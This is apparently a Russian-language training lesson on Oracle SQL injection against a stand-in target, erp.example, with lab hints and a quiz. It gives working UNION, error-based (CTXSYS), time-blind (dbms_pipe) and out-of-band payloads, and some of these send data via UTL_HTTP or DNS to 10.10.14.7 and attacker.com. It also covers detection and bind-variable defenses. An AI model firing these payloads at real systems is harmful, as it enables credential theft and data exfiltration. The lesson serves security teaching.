---
id: db-oracle
title: "Oracle: инъекции на практике — OOB через UTL_HTTP и DNS"
category: web
parent: web-sqli-dbms-enterprise
difficulty: hard
order: 2
tags: [sqli, oracle, plsql, utl_http, utl_inaddr, oob, all_tables, sqlmap]
prerequisites: [web-sqli, web-sqli-dbms]
useful_for:
  - "CTF Web категория"
  - "Пентест корпоративных приложений"
  - "Bug bounty"
estimated_minutes: 50
summary: "Oracle от фингерпринта до OOB: all_tables, error-based через CTXSYS, time-blind через dbms_pipe, UTL_HTTP/DNS и PL/SQL-инъекции."
lab:
  kind: shell
  title: 'Практика: Oracle — LISTAGG и дамп'
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - "Повторение (`web-sqli`): сначала фингерпринт — `curl -s \"http://erp.example/report?id=1'\"`; `ORA-01756` = Oracle."
    - 'Диалект: `curl -s "https://erp.example/report?id=1''"` — `ORA-01756`.'
    - 'В Oracle каждый `SELECT` без таблицы требует `FROM dual`.'
    - 'Таблицы: `FROM user_tables` + `LISTAGG(table_name,'','') WITHIN GROUP (ORDER BY table_name)`.'
    - 'Флаг — в `SECRETS` (некавычечные имена в верхнем регистре).'
---

## Задача

**Oracle** — самая «непохожая» на остальных СУБД. Здесь нет `information_schema` в привычном виде, нет `LIMIT`, строки конкатенируются через `||`, а некавычечные идентификаторы приводятся к ВЕРХНЕМУ регистру. Зато Oracle богат на функции для **out-of-band** (OOB) — канала, когда сервер сам обращается к нам: `UTL_HTTP` (HTTP-запросы), `UTL_INADDR` (DNS), `UTL_TCP` (сырые сокеты).

Если прямой вывод закрыт, OOB через DNS часто остаётся единственным каналом. Разберём Oracle на одном примере.

## Данные, с которыми работаем

Цель — `https://erp.example/report?id=1` (Java + Oracle). Признаки Oracle в ошибках: `ORA-00933: SQL command not properly ended`, `ORA-01756: quoted string not properly terminated`, `ORA-00942: table or view does not exist`.

```bash
$ curl -s "https://erp.example/report?id=1%27" | grep -o 'ORA-[0-9]*:[^<]*'
ORA-01756: quoted string not properly terminated
```

Это Oracle. Читаем версию. Помни: в Oracle **каждый** `SELECT` требует `FROM dual` (виртуальная таблица-заглушка), если не выбирается из реальной:

```bash
$ curl -s "https://erp.example/report?id=-1 UNION SELECT 1,(SELECT banner FROM v$version WHERE rownum=1),3 FROM dual-- -"
[[1,"Oracle Database 19c Enterprise Edition Release 19.0.0.0.0",3]]
```

`rownum=1` — способ взять первую строку (аналог `LIMIT 1`).

## Шаг 1: схема через all_tables

Вместо `information_schema` у Oracle словари `USER_*` (свои объекты), `ALL_*` (доступные) и `DBA_*` (все, нужны права):

```bash
$ curl -s "https://erp.example/report?id=-1 UNION SELECT 1,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),3 FROM user_tables-- -"
[[1,"ORDERS,PRODUCTS,USERS",3]]
```

Агрегация строк — `LISTAGG` (11g R2+); в древних версиях собирают через `XMLAGG`. Колонки — в `all_tab_columns`:

```bash
$ curl -s "https://erp.example/report?id=-1 UNION SELECT 1,LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id),3 FROM user_tab_columns WHERE table_name='USERS'-- -"
[[1,"ID,USERNAME,PASSWORD,EMAIL",3]]
```

**`LIMIT`/`OFFSET` в Oracle не работают** — это частая ошибка при переносе payload с MySQL. Используй `ROWNUM` или `FETCH FIRST n ROWS ONLY` (12c+).

## Шаг 2: дамп данных

Собираем учётки конкатенацией `||` и разделителем `CHR(10)` (перевод строки):

```bash
$ curl -s "https://erp.example/report?id=-1 UNION SELECT 1,LISTAGG(username||':'||password,CHR(10)) WITHIN GROUP (ORDER BY username),3 FROM users-- -"
>ADMIN:Oracl3_S3cret
SVC_APP:app_pass123<
```

## Шаг 3: error-based через CTXSYS

Когда вывод не отражается, но видно ошибку, Oracle печатает данные в тексте исключения. Классический путь — пакет Oracle Text `CTXSYS.DRITHSX.SN`:

```bash
$ curl -s "https://erp.example/report?id=1 AND 1=(SELECT CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual)) FROM dual)-- -" | grep -o 'ORA-20000[^<]*'
ORA-20000: Oracle Text error: ... APP ...
```

Из-за лимита длины данные режут `SUBSTR(...,1,30)` и склеивают из нескольких ошибок. Есть и другие каналы: `XMLType`, `DBMS_XMLGEN.GETXML`, а также `UTL_INADDR.GET_HOST_NAME((SELECT ...))` — он превращает строку в DNS-имя и возвращает её же в тексте ошибки `ORA-292257`.

## Шаг 4: time-blind через dbms_pipe

`SLEEP` в Oracle нет. Задержку делают пакетом `dbms_pipe.receive_message` — он «ждёт сообщения» указанное число секунд:

```bash
$ time curl -s -o /dev/null "https://erp.example/report?id=1 AND 1=(SELECT 1 FROM dual WHERE 1=(SELECT dbms_pipe.receive_message('a',5) FROM dual))-- -"
real    0m5.05s
```

Подставив в `WHERE` своё условие, получаем булев оракул: 5 секунд = «да».

## Шаг 5: OOB через UTL_HTTP и DNS

Если сервер не отражает ни данные, ни ошибки, ни время — остаётся **out-of-band**: заставить Oracle самому сделать запрос к нашему хосту и унести данные в поддомене или URL. Мы слушаем DNS/HTTP на своём хосте (`10.10.14.7`), а Oracle шлёт запрос:

```bash
$ curl -s "https://erp.example/report?id=1 AND 1=(SELECT UTL_HTTP.REQUEST('http://10.10.14.7/'||(SELECT user FROM dual)) FROM dual)-- -"
```

На нашем listener'е появляется входящий запрос:

```text
GET /APP HTTP/1.1
Host: 10.10.14.7
```

`APP` — это имя пользователя Oracle, унесённое в URL. Так же через `UTL_INADDR.GET_HOST_ADDRESS((SELECT ...)||'.attacker.com')` данные уходят в DNS-запрос — это работает, даже если исходящий HTTP закрыт, но DNS разрешён.

## Шаг 6: PL/SQL-инъекция и путь к RCE

Oracle-приложения часто вызывают PL/SQL-процедуры, куда ввод попадает как аргумент. Инъекция в такой вызов позволяет добавить свой оператор или использовать `EXECUTE IMMEDIATE`. Путь к RCE — через **Java stored procedures**: если в БД включена Java-машина, можно создать Java-класс, вызывающий `Runtime.exec`, и выполнить его:

```sql
-- концептуально: создать Java-источник и обёртку-процедуру, затем вызвать её
```

Это сложнее, чем в MSSQL/PostgreSQL, и требует прав; на реальном тесте чаще ограничиваются дампом и OOB-утечкой.

## Полный прогон от начала до конца

1. `id=1'` → `ORA-01756` — Oracle, инъекция есть.
2. `UNION SELECT banner FROM v$version FROM dual` → `Oracle Database 19c`.
3. `user_tables` + `LISTAGG` → `ORDERS,PRODUCTS,USERS`.
4. `LISTAGG(username||':'||password,CHR(10))` → реальные учётки.
5. `CTXSYS.DRITHSX.SN` → error-based канал.
6. `dbms_pipe.receive_message('a',5)` → time-blind.
7. `UTL_HTTP.REQUEST('http://10.10.14.7/'||user)` → данные пришли на наш listener.

## Если не сработало

- **Перенёс `LIMIT` из MySQL.** В Oracle его нет — используй `ROWNUM`/`FETCH FIRST`.
- **`#` не комментирует.** Только `--` и `/* */`.
- **Забыл `FROM dual`.** Каждый `SELECT` без таблицы требует `FROM dual`.
- **Регистр.** Некавычечные имена — в ВЕРХНЕМ регистре (`USERS`, а не `users`).
- **UTL_HTTP/UTL_INADDR отключены.** Часто закрыты ACL-политикой; тогда пробуй `CTXSYS`/`DBMS_XMLGEN` error-based.
- **sqlmap.** `sqlmap -r request.txt -p id --batch --dbms=oracle --dbs`; для OOB — `--dns-domain` или `--os-shell` через Java.

## Шаг 7: собираем длинные строки из OOB-запросов

OOB-канал несёт ограниченный объём: имя хоста в DNS ограничено, URL в HTTP — тоже. Поэтому данные
режут на части и склеивают из нескольких запросов. В Oracle для этого удобны `SUBSTR` и `CHR`:

```bash
# первая часть
$ curl -s "https://erp.example/report?id=1 AND 1=(SELECT UTL_HTTP.REQUEST('http://10.10.14.7/'||(SELECT SUBSTR(username,1,10) FROM users WHERE rownum=1)) FROM dual)-- -"
# вторая часть
$ curl -s "https://erp.example/report?id=1 AND 1=(SELECT UTL_HTTP.REQUEST('http://10.10.14.7/'||(SELECT SUBSTR(username,11,10) FROM users WHERE rownum=1)) FROM dual)-- -"
```

На listener'е появляются два запроса: `/ADMIN` и `/ISTRATOR` — склеив, получаем `ADMINISTRATOR`. Так
же посимвольно вытаскивают хеши паролей и любые длинные значения. Для удобства части кодируют в hex
(через `RAWTOHEX`), чтобы не терять спецсимволы в URL.

## Шаг 8: когда OOB закрыт — error-based и time-blind

Если `UTL_HTTP`/`UTL_INADDR` отключены ACL-политикой (частая практика в hardened-БД), OOB
недоступен. Тогда:

- **error-based** — `CTXSYS.DRITHSX.SN`, `DBMS_XMLGEN.GETXML`, `XMLType`. Данные попадают в текст
  `ORA-20000`/`ORA-292257`, их вытаскивают регуляркой.
- **time-blind** — `dbms_pipe.receive_message('a',N)` как булев оракул: 5 секунд = «истина». Медленно
  (бит за бит), но работает при полном отсутствии вывода и OOB.

Порядок выбора канала: UNION → error-based → OOB (HTTP, затем DNS) → time-blind. Начинай с самого
быстрого и падай к более медленному по мере закрытия предыдущих.

## Как это видят защитники

Oracle-инъекции оставляют следы в логах СУБД и на периметре:

- **`ORA-` ошибки** в логах приложения/БД (`ORA-01756`, `ORA-00933`) — попытка инъекции;
- **исходящие HTTP/DNS** от сервера БД к внешним адресам — работа `UTL_HTTP`/`UTL_INADDR` (OOB);
- **запросы к `all_tables`/`user_tab_columns`/`v$version`** — разведка схемы;
- **`dbms_pipe.receive_message`** с нетипичной задержкой — time-blind.

Правильная защита — параметризованные запросы (bind-переменные) и минимум прав: отключённые
`UTL_HTTP`/`UTL_INADDR`, закрытые ACL, отсутствие `DBA_*`. Тогда инъекция если и есть, то дампа не
даёт.

## Шпаргалка: синтаксис Oracle для инъекций

| Задача | Oracle |
|---|---|
| Комментарий | `--` (и `/* */`); `#` не работает |
| Виртуальный SELECT | `... FROM dual` |
| Ограничить строки | `WHERE rownum=1` / `FETCH FIRST 1 ROWS ONLY` |
| Конкатенация | `||` |
| Агрегация строк | `LISTAGG(col,',') WITHIN GROUP (ORDER BY col)` |
| Каталог | `all_tables`, `all_tab_columns`, `user_tables` |
| Версия | `v$version` |
| Задержка | `dbms_pipe.receive_message('a',N)` |
| OOB HTTP | `UTL_HTTP.REQUEST('http://...')` |
| OOB DNS | `UTL_INADDR.GET_HOST_ADDRESS('x.attacker.com')` |

## На что смотреть дальше

- **Нет `information_schema`.** Твой каталог — `all_tables`/`user_tables`/`all_tab_columns`.
- **`FROM dual` обязателен** для «виртуальных» SELECT — иначе синтаксическая ошибка.
- **Регистр в Oracle важен.** Идентификаторы по умолчанию в верхнем регистре.
- **Error-based богат:** `CTXSYS`, `XMLType`, `UTL_INADDR` — выбирай, что разрешено.
- **OOB — спасение в слепой зоне.** DNS-запрос через `UTL_INADDR` проходит чаще HTTP.
- **RCE через Java stored procs** — редко и требует прав; фиксируй дамп/OOB как основной артефакт и не
  рискуй стабильностью БД ради него.

<!-- lab -->

## Что мы теперь знаем

- Oracle отличается от других СУБД: `FROM dual`, `ROWNUM`/`FETCH FIRST` вместо `LIMIT`, `||` для
  конкатенации и идентификаторы в ВЕРХНЕМ регистре.
- Каталог схемы — `all_tables`/`user_tables`/`all_tab_columns`, версия — `v$version`.
- Каналы вывода по убыванию скорости: UNION → error-based (`CTXSYS`, `DBMS_XMLGEN`) → OOB
  (`UTL_HTTP`/`UTL_INADDR`) → time-blind (`dbms_pipe`).
- OOB переносит данные частями (`SUBSTR`) в поддомене/URL; DNS проходит чаще HTTP.
- Защита — bind-переменные и минимум прав (без `UTL_*`, `DBA_*`), а также отключённая Java в БД.

## Квиз

Проверь себя.

```quiz
- question: 'Ошибка `ORA-01756: quoted string not properly terminated` — это какая СУБД?'
  options:
    - "MySQL"
    - "PostgreSQL"
    - "Oracle"
    - "MSSQL"
  answer: 2
  explanation: "Коды ORA-XXXX — отпечаток Oracle."
- question: "Почему payload `... LIMIT 1` ломается в Oracle?"
  options:
    - "Он слишком длинный"
    - "В Oracle нет LIMIT — используют ROWNUM или FETCH FIRST"
    - "Нужно двоеточие"
    - "Он требует прав root"
  answer: 1
  explanation: "LIMIT/OFFSET не поддерживаются; ограничение строк — через ROWNUM/FETCH FIRST."
- question: "Зачем в Oracle пишут FROM dual?"
  options:
    - "Чтобы ускорить запрос"
    - "Потому что каждый SELECT без реальной таблицы требует FROM dual"
    - "Чтобы обойти WAF"
    - "Это комментарий"
  answer: 1
  explanation: "dual — виртуальная таблица-заглушка, обязательная для SELECT без данных."
- question: "Какая функция уносит данные в DNS-запрос (OOB)?"
  options:
    - "LISTAGG"
    - "UTL_INADDR.GET_HOST_ADDRESS"
    - "ROWNUM"
    - "CHR(10)"
  answer: 1
  explanation: "UTL_INADDR превращает строку в DNS-имя, унося данные в запрос к нашему резолверу."
- question: "Как организовать time-blind в Oracle?"
  options:
    - "SLEEP(5)"
    - "pg_sleep(5)"
    - "dbms_pipe.receive_message('a',5)"
    - "WAITFOR DELAY"
  answer: 2
  explanation: "dbms_pipe.receive_message блокирует выполнение на N секунд — это time-оракул Oracle."
```

## Куда дальше

Мы закончили пять СУБД. Дальше — инструменты: следующий урок (`web-tool-sqlmap`) покажет, как автоматизировать фингерпринт, дамп и даже OS-shell одной командой. А пока главное запомни: Oracle не похож на других — `FROM dual`, `all_tables`, `LISTAGG`, `ROWNUM`, а в слепой зоне спасает OOB через `UTL_HTTP`/`UTL_INADDR`.

## Где пригодится

- **CTF (Web):** Oracle-задачи на `all_tables`, error-based и OOB.
- **Пентест корпоративных приложений:** ERP/банковские системы на Oracle; дамп учёток — critical.
- **Bug bounty:** реже, но инъекция в Oracle-приложении — высокооплачиваемая находка.
- **Работа (AppSec):** минимум прав, отключённые `UTL_HTTP`/Java, ACL-политики сети — базовые меры.
